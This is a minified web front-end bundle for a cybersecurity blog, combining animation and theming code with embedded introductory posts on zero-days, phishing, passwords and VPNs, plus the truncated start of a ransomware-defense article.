p=pi();c?fs(p,n.applyTransform(a,!0),r.measuredBox):fs(p,s,r.layoutBox);const f=!xy(d);let m=!1;if(!n.resumeFrom){const y=n.getClosestProjectingParent();if(y&&!y.resumeFrom){const{snapshot:v,layout:w}=y;if(v&&w){const A=$e();gs(A,r.layoutBox,v.layoutBox);const k=$e();gs(k,s,w.layoutBox),Sy(A,k)||(m=!0),y.options.layoutRoot&&(n.relativeTarget=k,n.relativeTargetOrigin=A,n.relativeParent=y)}}}n.notifyListeners("didUpdate",{layout:s,snapshot:r,delta:p,layoutDelta:d,hasLayoutChanged:f,hasRelativeTargetChanged:m})}else if(n.isLead()){const{onExitComplete:s}=n.options;s&&s()}n.options.transition=void 0}function q1(n){hr.totalNodes++,n.parent&&(n.isProjecting()||(n.isProjectionDirty=n.parent.isProjectionDirty),n.isSharedProjectionDirty||(n.isSharedProjectionDirty=!!(n.isProjectionDirty||n.parent.isProjectionDirty||n.parent.isSharedProjectionDirty)),n.isTransformDirty||(n.isTransformDirty=n.parent.isTransformDirty))}function G1(n){n.isProjectionDirty=n.isSharedProjectionDirty=n.isTransformDirty=!1}function K1(n){n.clearSnapshot()}function cg(n){n.clearMeasurements()}function J1(n){n.isLayoutDirty=!1}function Q1(n){const{visualElement:e}=n.options;e&&e.getProps().onBeforeLayoutMeasure&&e.notify("BeforeLayoutMeasure"),n.resetTransform()}function ug(n){n.finishAnimation(),n.targetDelta=n.relativeTarget=n.target=void 0,n.isProjectionDirty=!0}function Y1(n){n.resolveTargetDelta()}function X1(n){n.calcProjection()}function Z1(n){n.resetRotation()}function e2(n){n.removeLeadSnapshot()}function dg(n,e,r){n.translate=Ne(e.translate,0,r),n.scale=Ne(e.scale,1,r),n.origin=e.origin,n.originPoint=e.originPoint}function hg(n,e,r,s){n.min=Ne(e.min,r.min,s),n.max=Ne(e.max,r.max,s)}function t2(n,e,r,s){hg(n.x,e.x,r.x,s),hg(n.y,e.y,r.y,s)}function n2(n){return n.animationValues&&n.animationValues.opacityExit!==void 0}const r2={duration:.45,ease:[.4,0,.1,1]},pg=n=>typeof navigator<"u"&&navigator.userAgent.toLowerCase().includes(n),fg=pg("applewebkit/")&&!pg("chrome/")?Math.round:Ve;function gg(n){n.min=fg(n.min),n.max=fg(n.max)}function i2(n){gg(n.x),gg(n.y)}function Ay(n,e,r){return n==="position"||n==="preserve-aspect"&&!uu(sg(e),sg(r),.2)}const s2=Ty({attachResizeListener:(n,e)=>pn(n,"resize",e),measureScroll:()=>({x:document.documentElement.scrollLeft||document.body.scrollLeft,y:document.documentElement.scrollTop||document.body.scrollTop}),checkIsScrollRoot:()=>!0}),Vc={current:void 0},Cy=Ty({measureScroll:n=>({x:n.scrollLeft,y:n.scrollTop}),defaultParent:()=>{if(!Vc.current){const n=new s2({});n.mount(window),n.setOptions({layoutScroll:!0}),Vc.current=n}return Vc.current},resetTransform:(n,e)=>{n.style.transform=e!==void 0?e:"none"},checkIsScrollRoot:n=>window.getComputedStyle(n).position==="fixed"}),o2={pan:{Feature:x1},drag:{Feature:k1,ProjectionNode:Cy,MeasureLayout:vy}},a2=/var\((--[a-zA-Z0-9-_]+),? ?([a-zA-Z0-9 ()%#.,-]+)?\)/;function l2(n){const e=a2.exec(n);if(!e)return[,];const[,r,s]=e;return[r,s]}function fu(n,e,r=1){const[s,a]=l2(n);if(!s)return;const l=window.getComputedStyle(e).getPropertyValue(s);if(l){const c=l.trim();return ly(c)?parseFloat(c):c}else return ru(a)?fu(a,e,r+1):a}function c2(n,{...e},r){const s=n.current;if(!(s instanceof Element))return{target:e,transitionEnd:r};r&&(r={...r}),n.values.forEach(a=>{const l=a.get();if(!ru(l))return;const c=fu(l,s);c&&a.set(c)});for(const a in e){const l=e[a];if(!ru(l))continue;const c=fu(l,s);c&&(e[a]=c,r||(r={}),r[a]===void 0&&(r[a]=l))}return{target:e,transitionEnd:r}}const u2=new Set(["width","height","top","left","right","bottom","x","y","translateX","translateY"]),Ey=n=>u2.has(n),d2=n=>Object.keys(n).some(Ey),mg=n=>n===Tr||n===ce,yg=(n,e)=>parseFloat(n.split(", ")[e]),bg=(n,e)=>(r,{transform:s})=>{if(s==="none"||!s)return 0;const a=s.match(/^matrix3d\((.+)\)$/);if(a)return yg(a[1],e);{const l=s.match(/^matrix\((.+)\)$/);return l?yg(l[1],n):0}},h2=new Set(["x","y","z"]),p2=Cs.filter(n=>!h2.has(n));function f2(n){const e=[];return p2.forEach(r=>{const s=n.getValue(r);s!==void 0&&(e.push([r,s.get()]),s.set(r.startsWith("scale")?1:0))}),e.length&&n.render(),e}const yi={width:({x:n},{paddingLeft:e="0",paddingRight:r="0"})=>n.max-n.min-parseFloat(e)-parseFloat(r),height:({y:n},{paddingTop:e="0",paddingBottom:r="0"})=>n.max-n.min-parseFloat(e)-parseFloat(r),top:(n,{top:e})=>parseFloat(e),left:(n,{left:e})=>parseFloat(e),bottom:({y:n},{top:e})=>parseFloat(e)+(n.max-n.min),right:({x:n},{left:e})=>parseFloat(e)+(n.max-n.min),x:bg(4,13),y:bg(5,14)};yi.translateX=yi.x;yi.translateY=yi.y;const g2=(n,e,r)=>{const s=e.measureViewportBox(),a=e.current,l=getComputedStyle(a),{display:c}=l,d={};c==="none"&&e.setStaticValue("display",n.display||"block"),r.forEach(f=>{d[f]=yi[f](s,l)}),e.render();const p=e.measureViewportBox();return r.forEach(f=>{const m=e.getValue(f);m&&m.jump(d[f]),n[f]=yi[f](p,l)}),n},m2=(n,e,r={},s={})=>{e={...e},s={...s};const a=Object.keys(e).filter(Ey);let l=[],c=!1;const d=[];if(a.forEach(p=>{const f=n.getValue(p);if(!n.hasValue(p))return;let m=r[p],y=os(m);const v=e[p];let w;if(la(v)){const A=v.length,k=v[0]===null?1:0;m=v[k],y=os(m);for(let x=k;x<A&&v[x]!==null;x++)w?qu(os(v[x])===w):w=os(v[x])}else w=os(v);if(y!==w)if(mg(y)&&mg(w)){const A=f.get();typeof A=="string"&&f.set(parseFloat(A)),typeof v=="string"?e[p]=parseFloat(v):Array.isArray(v)&&w===ce&&(e[p]=v.map(parseFloat))}else y?.transform&&w?.transform&&(m===0||v===0)?m===0?f.set(w.transform(m)):e[p]=y.transform(v):(c||(l=f2(n),c=!0),d.push(p),s[p]=s[p]!==void 0?s[p]:e[p],f.jump(v))}),d.length){const p=d.indexOf("height")>=0?window.pageYOffset:null,f=g2(e,n,d);return l.length&&l.forEach(([m,y])=>{n.getValue(m).set(y)}),n.render(),Sa&&p!==null&&window.scrollTo({top:p}),{target:f,transitionEnd:s}}else return{target:e,transitionEnd:s}};function y2(n,e,r,s){return d2(e)?m2(n,e,r,s):{target:e,transitionEnd:s}}const b2=(n,e,r,s)=>{const a=c2(n,e,s);return e=a.target,s=a.transitionEnd,y2(n,e,r,s)},gu={current:null},Py={current:!1};function v2(){if(Py.current=!0,!!Sa)if(window.matchMedia){const n=window.matchMedia("(prefers-reduced-motion)"),e=()=>gu.current=n.matches;n.addListener(e),e()}else gu.current=!1}function w2(n,e,r){const{willChange:s}=e;for(const a in e){const l=e[a],c=r[a];if(wt(l))n.addValue(a,l),ha(s)&&s.add(a);else if(wt(c))n.addValue(a,mi(l,{owner:n})),ha(s)&&s.remove(a);else if(c!==l)if(n.hasValue(a)){const d=n.getValue(a);!d.hasAnimated&&d.set(l)}else{const d=n.getStaticValue(a);n.addValue(a,mi(d!==void 0?d:l,{owner:n}))}}for(const a in r)e[a]===void 0&&n.removeValue(a);return e}const vg=new WeakMap,_y=Object.keys(ks),k2=_y.length,wg=["AnimationStart","AnimationComplete","Update","BeforeLayoutMeasure","LayoutMeasure","LayoutAnimationStart","LayoutAnimationComplete"],x2=Nu.length;class S2{constructor({parent:e,props:r,presenceContext:s,reducedMotionConfig:a,visualState:l},c={}){this.current=null,this.children=new Set,this.isVariantNode=!1,this.isControllingVariants=!1,this.shouldReduceMotion=null,this.values=new Map,this.features={},this.valueSubscriptions=new Map,this.prevMotionValues={},this.events={},this.propEventSubscriptions={},this.notifyUpdate=()=>this.notify("Update",this.latestValues),this.render=()=>{this.current&&(this.triggerBuild(),this.renderInstance(this.current,this.renderState,this.props.style,this.projection))},this.scheduleRender=()=>Ie.render(this.render,!1,!0);const{latestValues:d,renderState:p}=l;this.latestValues=d,this.baseTarget={...d},this.initialValues=r.initial?{...d}:{},this.renderState=p,this.parent=e,this.props=r,this.presenceContext=s,this.depth=e?e.depth+1:0,this.reducedMotionConfig=a,this.options=c,this.isControllingVariants=Aa(r),this.isVariantNode=pm(r),this.isVariantNode&&(this.variantChildren=new Set),this.manuallyAnimateOnMount=!!(e&&e.current);const{willChange:f,...m}=this.scrapeMotionValuesFromProps(r,{});for(const y in m){const v=m[y];d[y]!==void 0&&wt(v)&&(v.set(d[y],!1),ha(f)&&f.add(y))}}scrapeMotionValuesFromProps(e,r){return{}}mount(e){this.current=e,vg.set(e,this),this.projection&&!this.projection.instance&&this.projection.mount(e),this.parent&&this.isVariantNode&&!this.isControllingVariants&&(this.removeFromVariantTree=this.parent.addVariantChild(this)),this.values.forEach((r,s)=>this.bindToMotionValue(s,r)),Py.current||v2(),this.shouldReduceMotion=this.reducedMotionConfig==="never"?!1:this.reducedMotionConfig==="always"?!0:gu.current,this.parent&&this.parent.children.add(this),this.update(this.props,this.presenceContext)}unmount(){vg.delete(this.current),this.projection&&this.projection.unmount(),yn(this.notifyUpdate),yn(this.render),this.valueSubscriptions.forEach(e=>e()),this.removeFromVariantTree&&this.removeFromVariantTree(),this.parent&&this.parent.children.delete(this);for(const e in this.events)this.events[e].clear();for(const e in this.features)this.features[e].unmount();this.current=null}bindToMotionValue(e,r){const s=Sr.has(e),a=r.on("change",c=>{this.latestValues[e]=c,this.props.onUpdate&&Ie.update(this.notifyUpdate,!1,!0),s&&this.projection&&(this.projection.isTransformDirty=!0)}),l=r.on("renderRequest",this.scheduleRender);this.valueSubscriptions.set(e,()=>{a(),l()})}sortNodePosition(e){return!this.current||!this.sortInstanceNodePosition||this.type!==e.type?0:this.sortInstanceNodePosition(this.current,e.current)}loadFeatures({children:e,...r},s,a,l){let c,d;for(let p=0;p<k2;p++){const f=_y[p],{isEnabled:m,Feature:y,ProjectionNode:v,MeasureLayout:w}=ks[f];v&&(c=v),m(r)&&(!this.features[f]&&y&&(this.features[f]=new y(this)),w&&(d=w))}if((this.type==="html"||this.type==="svg")&&!this.projection&&c){this.projection=new c(this.latestValues,this.parent&&this.parent.projection);const{layoutId:p,layout:f,drag:m,dragConstraints:y,layoutScroll:v,layoutRoot:w}=r;this.projection.setOptions({layoutId:p,layout:f,alwaysMeasureLayout:!!m||y&&di(y),visualElement:this,scheduleRender:()=>this.scheduleRender(),animationType:typeof f=="string"?f:"both",initialPromotionConfig:l,layoutScroll:v,layoutRoot:w})}return d}updateFeatures(){for(const e in this.features){const r=this.features[e];r.isMounted?r.update():(r.mount(),r.isMounted=!0)}}triggerBuild(){this.build(this.renderState,this.latestValues,this.options,this.props)}measureViewportBox(){return this.current?this.measureInstanceViewportBox(this.current,this.props):$e()}getStaticValue(e){return this.latestValues[e]}setStaticValue(e,r){this.latestValues[e]=r}makeTargetAnimatable(e,r=!0){return this.makeTargetAnimatableFromInstance(e,this.props,r)}update(e,r){(e.transformTemplate||this.props.transformTemplate)&&this.scheduleRender(),this.prevProps=this.props,this.props=e,this.prevPresenceContext=this.presenceContext,this.presenceContext=r;for(let s=0;s<wg.length;s++){const a=wg[s];this.propEventSubscriptions[a]&&(this.propEventSubscriptions[a](),delete this.propEventSubscriptions[a]);const l=e["on"+a];l&&(this.propEventSubscriptions[a]=this.on(a,l))}this.prevMotionValues=w2(this,this.scrapeMotionValuesFromProps(e,this.prevProps),this.prevMotionValues),this.handleChildMotionValue&&this.handleChildMotionValue()}getProps(){return this.props}getVariant(e){return this.props.variants?this.props.variants[e]:void 0}getDefaultTransition(){return this.props.transition}getTransformPagePoint(){return this.props.transformPagePoint}getClosestVariantNode(){return this.isVariantNode?this:this.parent?this.parent.getClosestVariantNode():void 0}getVariantContext(e=!1){if(e)return this.parent?this.parent.getVariantContext():void 0;if(!this.isControllingVariants){const s=this.parent?this.parent.getVariantContext()||{}:{};return this.props.initial!==void 0&&(s.initial=this.props.initial),s}const r={};for(let s=0;s<x2;s++){const a=Nu[s],l=this.props[a];(ws(l)||l===!1)&&(r[a]=l)}return r}addVariantChild(e){const r=this.getClosestVariantNode();if(r)return r.variantChildren&&r.variantChildren.add(e),()=>r.variantChildren.delete(e)}addValue(e,r){r!==this.values.get(e)&&(this.removeValue(e),this.bindToMotionValue(e,r)),this.values.set(e,r),this.latestValues[e]=r.get()}removeValue(e){this.values.delete(e);const r=this.valueSubscriptions.get(e);r&&(r(),this.valueSubscriptions.delete(e)),delete this.latestValues[e],this.removeValueFromRenderState(e,this.renderState)}hasValue(e){return this.values.has(e)}getValue(e,r){if(this.props.values&&this.props.values[e])return this.props.values[e];let s=this.values.get(e);return s===void 0&&r!==void 0&&(s=mi(r,{owner:this}),this.addValue(e,s)),s}readValue(e){var r;return this.latestValues[e]!==void 0||!this.current?this.latestValues[e]:(r=this.getBaseTargetFromProps(this.props,e))!==null&&r!==void 0?r:this.readValueFromInstance(this.current,e,this.options)}setBaseTarget(e,r){this.baseTarget[e]=r}getBaseTarget(e){var r;const{initial:s}=this.props,a=typeof s=="string"||typeof s=="object"?(r=Hu(this.props,s))===null||r===void 0?void 0:r[e]:void 0;if(s&&a!==void 0)return a;const l=this.getBaseTargetFromProps(this.props,e);return l!==void 0&&!wt(l)?l:this.initialValues[e]!==void 0&&a===void 0?void 0:this.baseTarget[e]}on(e,r){return this.events[e]||(this.events[e]=new td),this.events[e].add(r)}notify(e,...r){this.events[e]&&this.events[e].notify(...r)}}class Iy extends S2{sortInstanceNodePosition(e,r){return e.compareDocumentPosition(r)&2?1:-1}getBaseTargetFromProps(e,r){return e.style?e.style[r]:void 0}removeValueFromRenderState(e,{vars:r,style:s}){delete r[e],delete s[e]}makeTargetAnimatableFromInstance({transition:e,transitionEnd:r,...s},{transformValues:a},l){let c=Ux(s,e||{},this);if(a&&(r&&(r=a(r)),s&&(s=a(s)),c&&(c=a(c))),l){Lx(this,s,c);const d=b2(this,s,c,r);r=d.transitionEnd,s=d.target}return{transition:e,transitionEnd:r,...s}}}function T2(n){return window.getComputedStyle(n)}class A2 extends Iy{constructor(){super(...arguments),this.type="html"}readValueFromInstance(e,r){if(Sr.has(r)){const s=Qu(r);return s&&s.default||0}else{const s=T2(e),a=(ym(r)?s.getPropertyValue(r):s[r])||0;return typeof a=="string"?a.trim():a}}measureInstanceViewportBox(e,{transformPagePoint:r}){return yy(e,r)}build(e,r,s,a){Uu(e,r,s,a.transformTemplate)}scrapeMotionValuesFromProps(e,r){return $u(e,r)}handleChildMotionValue(){this.childSubscription&&(this.childSubscription(),delete this.childSubscription);const{children:e}=this.props;wt(e)&&(this.childSubscription=e.on("change",r=>{this.current&&(this.current.textContent=`${r}`)}))}renderInstance(e,r,s,a){Sm(e,r,s,a)}}class C2 extends Iy{constructor(){super(...arguments),this.type="svg",this.isSVGTag=!1}getBaseTargetFromProps(e,r){return e[r]}readValueFromInstance(e,r){if(Sr.has(r)){const s=Qu(r);return s&&s.default||0}return r=Tm.has(r)?r:Mu(r),e.getAttribute(r)}measureInstanceViewportBox(){return $e()}scrapeMotionValuesFromProps(e,r){return Cm(e,r)}build(e,r,s,a){Vu(e,r,s,this.isSVGTag,a.transformTemplate)}renderInstance(e,r,s,a){Am(e,r,s,a)}mount(e){this.isSVGTag=Wu(e.tagName),super.mount(e)}}const E2=(n,e)=>Fu(n)?new C2(e,{enableHardwareAcceleration:!1}):new A2(e,{enableHardwareAcceleration:!0}),P2={layout:{ProjectionNode:Cy,MeasureLayout:vy}},_2={...t1,...kk,...o2,...P2},it=I0((n,e)=>lk(n,e,_2,E2));function Ry(){const n=C.useRef(!1);return ju(()=>(n.current=!0,()=>{n.current=!1}),[]),n}function I2(){const n=Ry(),[e,r]=C.useState(0),s=C.useCallback(()=>{n.current&&r(e+1)},[e]);return[C.useCallback(()=>Ie.postRender(s),[s]),e]}class R2 extends C.Component{getSnapshotBeforeUpdate(e){const r=this.props.childRef.current;if(r&&e.isPresent&&!this.props.isPresent){const s=this.props.sizeRef.current;s.height=r.offsetHeight||0,s.width=r.offsetWidth||0,s.top=r.offsetTop,s.left=r.offsetLeft}return null}componentDidUpdate(){}render(){return this.props.children}}function D2({children:n,isPresent:e}){const r=C.useId(),s=C.useRef(null),a=C.useRef({width:0,height:0,top:0,left:0});return C.useInsertionEffect(()=>{const{width:l,height:c,top:d,left:p}=a.current;if(e||!s.current||!l||!c)return;s.current.dataset.motionPopId=r;const f=document.createElement("style");return document.head.appendChild(f),f.sheet&&f.sheet.insertRule(`
          [data-motion-pop-id="${r}"] {
            position: absolute !important;
            width: ${l}px !important;
            height: ${c}px !important;
            top: ${d}px !important;
            left: ${p}px !important;
          }
        `),()=>{document.head.removeChild(f)}},[e]),C.createElement(R2,{isPresent:e,childRef:s,sizeRef:a},C.cloneElement(n,{ref:s}))}const Wc=({children:n,initial:e,isPresent:r,onExitComplete:s,custom:a,presenceAffectsLayout:l,mode:c})=>{const d=Em(O2),p=C.useId(),f=C.useMemo(()=>({id:p,initial:e,isPresent:r,custom:a,onExitComplete:m=>{d.set(m,!0);for(const y of d.values())if(!y)return;s&&s()},register:m=>(d.set(m,!1),()=>d.delete(m))}),l?void 0:[r]);return C.useMemo(()=>{d.forEach((m,y)=>d.set(y,!1))},[r]),C.useEffect(()=>{!r&&!d.size&&s&&s()},[r]),c==="popLayout"&&(n=C.createElement(D2,{isPresent:r},n)),C.createElement(xa.Provider,{value:f},n)};function O2(){return new Map}function j2(n){return C.useEffect(()=>()=>n(),[])}const pr=n=>n.key||"";function M2(n,e){n.forEach(r=>{const s=pr(r);e.set(s,r)})}function B2(n){const e=[];return C.Children.forEach(n,r=>{C.isValidElement(r)&&e.push(r)}),e}const N2=({children:n,custom:e,initial:r=!0,onExitComplete:s,exitBeforeEnter:a,presenceAffectsLayout:l=!0,mode:c="sync"})=>{const d=C.useContext(Lu).forceRender||I2()[0],p=Ry(),f=B2(n);let m=f;const y=C.useRef(new Map).current,v=C.useRef(m),w=C.useRef(new Map).current,A=C.useRef(!0);if(ju(()=>{A.current=!1,M2(f,w),v.current=m}),j2(()=>{A.current=!0,w.clear(),y.clear()}),A.current)return C.createElement(C.Fragment,null,m.map(_=>C.createElement(Wc,{key:pr(_),isPresent:!0,initial:r?void 0:!1,presenceAffectsLayout:l,mode:c},_)));m=[...m];const k=v.current.map(pr),x=f.map(pr),B=k.length;for(let _=0;_<B;_++){const P=k[_];x.indexOf(P)===-1&&!y.has(P)&&y.set(P,void 0)}return c==="wait"&&y.size&&(m=[]),y.forEach((_,P)=>{if(x.indexOf(P)!==-1)return;const M=w.get(P);if(!M)return;const V=k.indexOf(P);let U=_;if(!U){const W=()=>{y.delete(P);const G=Array.from(w.keys()).filter(ee=>!x.includes(ee));if(G.forEach(ee=>w.delete(ee)),v.current=f.filter(ee=>{const ye=pr(ee);return ye===P||G.includes(ye)}),!y.size){if(p.current===!1)return;d(),s&&s()}};U=C.createElement(Wc,{key:pr(M),isPresent:!1,onExitComplete:W,custom:e,presenceAffectsLayout:l,mode:c},M),y.set(P,U)}m.splice(V,0,U)}),m=m.map(_=>{const P=_.key;return y.has(P)?_:C.createElement(Wc,{key:pr(_),isPresent:!0,presenceAffectsLayout:l,mode:c},_)}),C.createElement(C.Fragment,null,y.size?m:m.map(_=>C.cloneElement(_)))},Dy=C.createContext(void 0);function L2({children:n,defaultTheme:e="system",storageKey:r="vite-ui-theme",...s}){const[a,l]=C.useState(()=>localStorage.getItem(r)||e);C.useEffect(()=>{const d=window.document.documentElement;if(d.classList.remove("light","dark"),a==="system"){const p=window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light";d.classList.add(p);return}d.classList.add(a)},[a]);const c={theme:a,setTheme:d=>{localStorage.setItem(r,d),l(d)}};return T.jsx(Dy.Provider,{...s,value:c,children:n})}const Gn=()=>{const n=C.useContext(Dy);if(n===void 0)throw new Error("useTheme must be used within a ThemeProvider");return n},F2=({currentHash:n})=>{const{theme:e}=Gn(),r="https://ethicalbyte.in/assets/img/logo.png",s="https://ethicalbyte.in/",a=l=>{const c=n===l||l==="#/"&&n==="#";let d="transition-colors flex items-center font-medium px-3 py-2 rounded-md text-sm ";return c?d+=e==="dark"?"bg-primary/20 text-primary":"bg-primary/10 text-primary":d+=e==="dark"?"text-slate-300 hover:text-primary hover:bg-primary/10":"text-foreground hover:text-primary hover:bg-primary/5",d};return T.jsx(it.nav,{initial:{y:-100},animate:{y:0},transition:{type:"spring",stiffness:120,damping:20},className:"sticky top-0 z-50 glassmorphism-nav",children:T.jsxs("div",{className:"container mx-auto px-4 py-3 flex justify-between items-center",children:[T.jsx("a",{href:s,target:"_blank",rel:"noopener noreferrer",className:"flex items-center",children:T.jsx("img",{src:r,alt:"EthicalByte Logo",className:"h-10 md:h-12"})}),T.jsxs("div",{className:"space-x-2 md:space-x-3",children:[T.jsxs("a",{href:"#/",className:a("#/"),children:[T.jsx(g0,{size:18,className:"mr-1.5"}),"Recent"]}),T.jsxs("a",{href:"#/all-blogs",className:a("#/all-blogs"),children:[T.jsx(sm,{size:18,className:"mr-1.5"}),"All Posts"]})]})]})})},U2=()=>{const{theme:n}=Gn(),e=new Date().getFullYear(),r=n==="dark"?"hover:text-primary":"text-muted-foreground hover:text-primary",s=n==="dark"?"text-slate-400":"text-muted-foreground",a=n==="dark"?"bg-slate-900/60":"bg-slate-50",l=n==="dark"?"border-slate-700/60":"border-border";return T.jsx("footer",{className:`${a} border-t ${l} ${s} py-8 mt-12`,children:T.jsxs("div",{className:"container mx-auto px-4 text-center",children:[T.jsxs("div",{className:"flex justify-center space-x-6 mb-4",children:[T.jsxs("a",{href:"https://github.com",target:"_blank",rel:"noopener noreferrer",className:`${r} transition-colors`,children:[T.jsx(u0,{size:22}),T.jsx("span",{className:"sr-only",children:"GitHub"})]}),T.jsxs("a",{href:"https://linkedin.com",target:"_blank",rel:"noopener noreferrer",className:`${r} transition-colors`,children:[T.jsx(p0,{size:22}),T.jsx("span",{className:"sr-only",children:"LinkedIn"})]}),T.jsxs("a",{href:"https://twitter.com",target:"_blank",rel:"noopener noreferrer",className:`${r} transition-colors`,children:[T.jsx(v0,{size:22}),T.jsx("span",{className:"sr-only",children:"Twitter"})]})]}),T.jsxs("p",{className:"text-sm",children:["© ",e," CyberSec Insights. All rights reserved."]}),T.jsx("p",{className:"text-xs mt-1",children:"Disclaimer: Information on this blog is for educational purposes only."})]})})},z2=({children:n,routeKey:e})=>T.jsxs("div",{className:"flex flex-col min-h-screen bg-background text-foreground",children:[T.jsx(F2,{currentHash:e}),T.jsx(it.main,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},exit:{opacity:0,y:-20},transition:{duration:.3},className:"flex-grow container mx-auto px-4 py-8",children:n},e),T.jsx(U2,{})]}),nd=[{id:"zero-day-vulnerabilities-explained",title:"Zero-Day Vulnerabilities: The Unseen Threat",date:"2025-05-23",author:"Alex Cryptos",summary:"Explore what zero-day vulnerabilities are, why they are so dangerous, and how organizations try to mitigate their impact.",tags:["zero-day","vulnerability","exploit","cyber defense"],imageKey:"zeroDayThreat",content:`
          <p>A zero-day vulnerability is a software security flaw that is known to the software vendor but doesn't have a patch in place to fix the flaw. It's called "zero-day" because the vendor has zero days to fix the problem before it potentially becomes known to attackers.</p>
          <h3>Why are Zero-Days Dangerous?</h3>
          <ul>
            <li><strong>No Defense:</strong> Since there's no patch, traditional signature-based antivirus software might not detect attacks exploiting the vulnerability.</li>
            <li><strong>High Value for Attackers:</strong> Zero-day exploits (the code attackers use to take advantage of a zero-day vulnerability) can be sold for high prices on the black market.</li>
            <li><strong>Widespread Impact:</strong> If the vulnerability exists in widely used software, millions of users could be at risk.</li>
          </ul>
          <h3>Mitigation Strategies:</h3>
          <p>While it's impossible to be completely immune to zero-day attacks, organizations and individuals can take steps:</p>
          <ol>
            <li><strong>Patch Management:</strong> Apply security patches promptly when they become available. While this doesn't stop zero-days, it closes known vulnerabilities.</li>
            <li><strong>Behavior-Based Detection:</strong> Security solutions that monitor for suspicious behavior rather than known signatures can sometimes detect zero-day exploits.</li>
            <li><strong>Network Segmentation:</strong> Limiting network access can help contain the damage if a system is compromised.</li>
            <li><strong>Security Awareness:</strong> Educating users about phishing and other attack vectors that might deliver zero-day exploits.</li>
          </ol>
          <p>The fight against zero-day threats is ongoing, requiring vigilance from software vendors, security researchers, and users alike.</p>
        `},{id:"understanding-phishing-attacks",title:"Understanding Phishing Attacks and How to Avoid Them",date:"2025-05-20",author:"Dr. Secure",summary:"Phishing remains one of the most common cyber threats. Learn to identify phishing attempts and protect your personal information.",tags:["phishing","email security","cyber awareness"],imageKey:"phishingConcept",content:`
          <p>Phishing is a type of social engineering attack often used to steal user data, including login credentials and credit card numbers. It happens when an attacker, masquerading as a trusted entity, dupes a victim into opening an email, instant message, or text message. The recipient is then tricked into clicking a malicious link, which can lead to the installation of malware, the freezing of the system as part of a ransomware attack, or the revealing of sensitive information.</p>
          <h3>Common Types of Phishing:</h3>
          <ul>
            <li><strong>Email Phishing:</strong> The most common type, using emails that appear to be from legitimate sources.</li>
            <li><strong>Spear Phishing:</strong> Targets specific individuals or companies, often with personalized information.</li>
            <li><strong>Whaling:</strong> A type of spear phishing aimed at senior executives.</li>
            <li><strong>Smishing and Vishing:</strong> Phishing attempts made via SMS text messages (Smishing) or voice calls (Vishing).</li>
          </ul>
          <h3>How to Identify Phishing Attempts:</h3>
          <ol>
            <li><strong>Check the Sender's Email Address:</strong> Look for slight misspellings or unusual domain names.</li>
            <li><strong>Beware of Urgent or Threatening Language:</strong> Attackers often try to create a sense of urgency.</li>
            <li><strong>Don't Click Suspicious Links:</strong> Hover over links to see the actual URL before clicking.</li>
            <li><strong>Look for Generic Greetings:</strong> "Dear Customer" instead of your name can be a red flag.</li>
            <li><strong>Verify Requests for Personal Information:</strong> Legitimate organizations rarely ask for sensitive data via email.</li>
          </ol>
          <h3>Protecting Yourself:</h3>
          <p>Enable two-factor authentication (2FA) on all your accounts, use strong, unique passwords, and keep your software updated. Be skeptical of unsolicited communications and always verify before providing information or clicking links.</p>
        `},{id:"importance-of-strong-passwords",title:"The Critical Importance of Strong and Unique Passwords",date:"2025-05-15",author:"Jane Cyber",summary:"Passwords are your first line of defense. Discover why strong, unique passwords are vital and how to manage them effectively.",tags:["passwords","account security","best practices"],imageKey:"passwordSecurity",content:`
          <p>In an era where digital accounts hold vast amounts of personal and financial information, the strength of your passwords cannot be overstated. Weak or reused passwords are a primary target for cybercriminals, leading to identity theft, financial loss, and unauthorized access to sensitive data.</p>
          <h3>What Makes a Strong Password?</h3>
          <ul>
            <li><strong>Length:</strong> At least 12-15 characters. Longer is generally better.</li>
            <li><strong>Complexity:</strong> A mix of uppercase letters, lowercase letters, numbers, and symbols.</li>
            <li><strong>Uniqueness:</strong> A different password for every account.</li>
            <li><strong>Unpredictability:</strong> Avoid common words, phrases, or easily guessable information like birthdays or names.</li>
          </ul>
          <h3>Why Unique Passwords Matter:</h3>
          <p>If one account is compromised and you've reused that password elsewhere, attackers can gain access to all those other accounts. This is known as credential stuffing. Using unique passwords for each service significantly limits the damage if one set of credentials is stolen.</p>
          <h3>Password Management Strategies:</h3>
          <ol>
            <li><strong>Use a Password Manager:</strong> These tools generate and store strong, unique passwords for all your accounts. You only need to remember one master password.</li>
            <li><strong>Enable Two-Factor Authentication (2FA):</strong> Adds an extra layer of security beyond just your password.</li>
            <li><strong>Regularly Update Critical Passwords:</strong> Especially for important accounts like banking and email.</li>
          </ol>
          <p>By prioritizing strong password hygiene, you significantly enhance your digital security posture.</p>
        `},{id:"introduction-to-vpn",title:"What is a VPN and Why Should You Use One?",date:"2025-05-10",author:"Net Guardian",summary:"VPNs are powerful tools for enhancing online privacy and security. Understand the basics of VPNs and their benefits.",tags:["vpn","privacy","online security","encryption"],imageKey:"vpnConcept",content:`
          <p>A Virtual Private Network (VPN) is a service that creates a secure, encrypted connection between your device and the internet. It routes your internet traffic through a server operated by the VPN provider, masking your IP address and encrypting your data.</p>
          <h3>How Does a VPN Work?</h3>
          <p>When you connect to a VPN, it establishes a "tunnel" for your data. All your internet traffic passes through this encrypted tunnel to the VPN server. The VPN server then sends your traffic to the internet. To any website or online service you visit, it appears as if your connection is originating from the VPN server's location, not your actual location.</p>
          <h3>Key Benefits of Using a VPN:</h3>
          <ul>
            <li><strong>Enhanced Privacy:</strong> Hides your real IP address, making it harder for websites, advertisers, and your ISP to track your online activities.</li>
            <li><strong>Improved Security:</strong> Encrypts your internet traffic, protecting your data from hackers, especially on public Wi-Fi networks.</li>
            <li><strong>Access Geo-Restricted Content:</strong> Allows you to bypass geographical restrictions on websites and streaming services by connecting to a server in a different country.</li>
            <li><strong>Secure Remote Access:</strong> Businesses use VPNs to allow employees to securely access company networks from remote locations.</li>
          </ul>
          <h3>Choosing a VPN:</h3>
          <p>When selecting a VPN provider, consider factors like their logging policy (no-logs is best), server locations, connection speeds, security protocols offered, and price. Reputable VPNs are transparent about their practices.</p>
          <p>Using a VPN is a simple yet effective step towards a more private and secure online experience.</p>
        `},{id:"ransomware-defense-strategies",title:"Ransomware: How to Defend and Recover",date:"2025-05-05",author:"Data Sentinel",summary:"Ransomware attacks are on the rise. Learn essential defense mechanisms and steps to take if you become a victim.",tags:["ransomware","data backup","incident response"],imageKey:"ransomwareLock",content:`
